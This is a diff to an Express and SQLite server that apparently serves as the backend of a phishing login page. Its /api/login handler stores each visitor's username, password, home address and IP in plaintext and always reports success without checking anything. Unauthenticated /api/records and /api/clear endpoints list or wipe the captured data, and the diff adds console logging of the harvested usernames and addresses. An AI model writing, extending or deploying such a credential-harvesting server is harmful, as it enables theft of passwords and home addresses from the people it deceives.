@@ -8,6 +8,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const db = new sqlite3.Database('./login_records.db');
 
+// Create table with address column
 db.run(`CREATE TABLE IF NOT EXISTS records (
     id INTEGER PRIMARY KEY,
     type TEXT,
@@ -20,8 +21,11 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
 
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+    
     db.run("INSERT INTO records (type, username, password, address, ip, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
         [type, username, password, address, ip, timestamp]);
+    
+    console.log(`✅ Saved: ${type} | User: ${username} | Address: ${address}`);
 }
 
 // Record visits
@@ -38,11 +42,13 @@ app.get('/login.html', (req, res) => {
 // Login with Home Address
 app.post('/api/login', (req, res) => {
     const { username, password, address } = req.body;
-    saveRecord('Login Attempt', username, password, address, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    
+    saveRecord('Login Attempt', username, password, address, ip);
     res.json({ success: true });
 });
 
-// Get records
+// Get all records for admin
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
         res.json(rows);
@@ -55,10 +61,10 @@ app.get('/admin', (req, res) => {
 
 app.post('/api/clear', (req, res) => {
     db.run("DELETE FROM records");
-    res.json({ message: 'Cleared' });
+    res.json({ message: 'All records cleared' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running`);
+    console.log(`🚀 Server running with permanent storage`);
 });
